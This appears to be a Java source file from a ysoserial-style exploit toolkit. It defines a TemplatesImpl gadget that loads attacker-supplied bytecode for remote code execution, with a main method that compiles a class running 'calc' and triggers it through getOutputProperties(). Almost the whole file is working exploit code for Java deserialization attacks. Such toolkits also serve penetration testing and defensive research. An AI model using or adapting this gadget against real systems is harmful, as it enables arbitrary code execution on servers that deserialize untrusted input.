package com.h2tg.ysogate.bullet.jdk;


import com.h2tg.ysogate.bullet.base.IGetter2DefineClass;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtConstructor;

import static com.h2tg.ysogate.utils.Gadgets.createTemplatesImpl;

public class GTemplates implements IGetter2DefineClass
{

    @Override
    public Object getter2RCE(byte[] bytes) throws Exception
    {
        if ( Boolean.parseBoolean(System.getProperty("properXalan", "false")) ) {
            return createTemplatesImpl(
                    bytes,
                    Class.forName("org.apache.xalan.xsltc.trax.TemplatesImpl"),
                    Class.forName("org.apache.xalan.xsltc.runtime.AbstractTranslet"),
                    Class.forName("org.apache.xalan.xsltc.trax.TransformerFactoryImpl"));
        }

        return createTemplatesImpl(bytes, TemplatesImpl.class, AbstractTranslet.class, TransformerFactoryImpl.class);
    }

    public static void main(String[] args)
    {
        try
        {
            ClassPool pool = ClassPool.getDefault();
            CtClass ctClass = pool.makeClass("a");
            CtClass superClass = pool.get(AbstractTranslet.class.getName());
            ctClass.setSuperclass(superClass);
            CtConstructor constructor = new CtConstructor(new CtClass[]{}, ctClass);

            constructor.setBody("Runtime.getRuntime().exec(\"calc\");");
            ctClass.addConstructor(constructor);
            byte[] bytes = ctClass.toBytecode();

            GTemplates gTemplates = new GTemplates();
            TemplatesImpl tmp = (TemplatesImpl) gTemplates.getter2RCE(bytes);

            tmp.getOutputProperties();

        }
        catch (Exception e)
        {
            e.printStackTrace();
        }
    }
}
